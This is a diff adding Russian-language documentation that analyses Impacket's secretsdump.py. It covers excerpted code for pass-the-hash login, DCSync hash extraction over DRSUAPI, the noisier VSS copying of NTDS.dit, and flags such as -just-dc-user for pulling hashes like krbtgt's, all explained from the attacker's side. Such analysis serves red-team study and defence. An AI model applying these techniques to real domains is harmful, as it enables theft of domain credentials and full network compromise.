@@ -304,3 +304,117 @@ if((cSuppATT_IntId >= 2) && pSuppATT_IntId[0] && pSuppATT_IntId[1])
   3) В конце проверяется наличие атрибутов `LAPS` (msMcsAdmPwd), и если они найдены, локальный административный пароль выводится в открытом виде.
 
 
+## Описание к secretsdump.py
+
+### 1. Инициализация и аутентификация
+
+```python
+class DumpSecrets:
+    def __init__(self, remoteName, username='', password='', domain='', options=None):
+        # ... инициализация переменных ...
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__doKerberos = options.k
+        # ...
+        if options.hashes is not None:
+            self.__lmhash, self.__nthash = options.hashes.split(':')
+
+    def connect(self):
+        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
+        if self.__doKerberos:
+            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                               self.__nthash, self.__aesKey, self.__kdcHost)
+        else:
+            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def ldapConnect(self):
+        # ... формирование baseDN ...
+        try:
+            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
+            # ... логин ...
+        except LDAPSessionError as e:
+            if str(e).find('strongerAuthRequired') >= 0:
+                # We need to try SSL
+                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
+                # ... повторный логин по LDAPS ...
+```
+Класс `DumpSecrets` подготавливает окружение для атаки. Метод `__init__` парсит переданные хэши (формат `LMHASH:NTHASH`), что позволяет использовать технику `Pass-the-Hash` без знания plaintext-пароля.
+Метод `connect` устанавливает SMB-сессию (порт 445), используя либо NTLM, либо Kerberos (если передан флаг -k и есть тикет в KRB5CCNAME).
+Метод `ldapConnect` критически важен для атаки DCSync (извлечение `NTDS.dit`). Скрипт сначала пытается подключиться по обычному LDAP (порт 389). Если контроллер домена отвергает соединение с ошибкой `strongerAuthRequired` (что типично для современных AD с включенным LDAP Channel Binding или Signing), скрипт автоматически `fallback-ится на LDAPS` (порт 636), чтобы установить зашифрованный канал, необходимый для последующих RPC-вызовов репликации.
+
+### 2. Ядро атаки: метод `dump` 
+
+```python
+    def dump(self):
+        try:
+            # ... пропуск локальных и WMI-методов для краткости ...
+            else:
+                self.__isRemote = True
+                bootKey = None
+                # ...
+                try:
+                    self.connect()
+                    self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__ldapConnection)
+                    self.__remoteOps.setExecMethod(self.__options.exec_method)
+                    
+                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
+                        self.__remoteOps.enable_registry() # Включает Remote Registry, если он выключен
+                        bootKey = self.__remoteOps.getBootKey()
+                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                except Exception as e:
+                    self.__canProcessSAMLSA = False
+                    # ... обработка ошибок ...
+
+                # NTDS Extraction we can try regardless of RemoteOperations failing.
+                if self.__isRemote is True:
+                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
+                        NTDSFileName = self.__remoteOps.saveNTDS() # Шумный метод: копирование файла
+                    else:
+                        NTDSFileName = None # Тихий метод: DRSUAPI (DCSync)
+
+                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, ...)
+                try:
+                    self.__NTDSHashes.dump()
+                # ...
+```
+Метод dump является оркестратором атаки. Он определяет, какой метод использовать:
+1) Тихий метод (по умолчанию, DRSUAPI): Если не указан флаг -use-vss, переменная `NTDSFileName` остается None. В этом случае класс `NTDSHashes` внутри себя использует протокол `MS-DRSR` (те же вызовы `IDL_DRSGetNCChanges`, что и в `Mimikatz DCSync`), чтобы выкачать хэши напрямую через RPC, не создавая файлов и не включая службы на целевой машине. Перед этим скрипт временно включает службу `Remote Registry (enable_registry)`, чтобы прочитать `BootKey` из реестра для расшифровки локальных секретов (если они тоже запрашиваются).
+2) Шумный метод (VSS / WMI): Если указан флаг `-use-vss` или `-use-remoteSSWMI`, скрипт использует механизмы удаленного выполнения кода `(smbexec/wmiexec)`, чтобы создать `Volume Shadow Copy` (теневую копию тома), скопировать файлы `NTDS.dit, SYSTEM и SAM` в C:\Windows\Temp\, скачать их по SMB и распарсить локально.
+
+### 3. Обработка ошибок и "подсказки" для атакующего
+```python
+                try:
+                    self.__NTDSHashes.dump()
+                except Exception as e:
+                    # ...
+                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                        # We don't store the resume file if this error happened, since this error is related to lack
+                        # of enough privileges to access DRSUAPI.
+                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                        if resumeFile is not None:
+                            os.unlink(resumeFile)
+                    logging.error(e)
+                    # ...
+                    elif self.__useVSSMethod is False:
+                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+```
+
+Этот блок показывает устойчивость инструмента. Если попытка извлечения через `DRSUAPI (DCSync)` проваливается (например, из-за ошибки `ERROR_DS_DRA_BAD_DN`, что часто означает отсутствие прав `DS-Replication-Get-Changes` у текущей учетной записи), скрипт не просто падает. Он удаляет файл состояния (resume file) и явно рекомендует атакующему переключиться на шумный, но более универсальный метод (-use-vss), который требует прав локального администратора, но не требует прав репликации AD.
+
+### 4. Аргументы командной строки 
+```python
+    parser.add_argument('-use-vss', action='store_true', default=False,
+                        help='Use the NTDSUTIL VSS method instead of default DRSUAPI')
+    parser.add_argument('-just-dc', action='store_true', default=False,
+                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
+    parser.add_argument('-just-dc-user', action='store', metavar='USERNAME',
+                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach.')
+    parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication...')
+```
+Эти аргументы определяют профиль атаки:
+* `-just-dc`: Указывает скрипту игнорировать локальные `SAM/LSA` и сосредоточиться только на контроллере домена (DCSync). Это самый частый сценарий.
+* `-just-dc-user`: Позволяет запросить через `DRSUAPI` хэши только одного конкретного пользователя (например, `krbtgt` или конкретного админа). Это снижает объем сетевого трафика.
+* `-use-vss`: Принудительное переключение на метод теневых копий (требует прав локального админа, создает артефакты на диске).
+* `-hashes / -k`: Использование скомпрометированных хэшей или Kerberos-тикетов для аутентификации, что позволяет избежать передачи паролей в открытом виде и обхода некоторых политик.
+
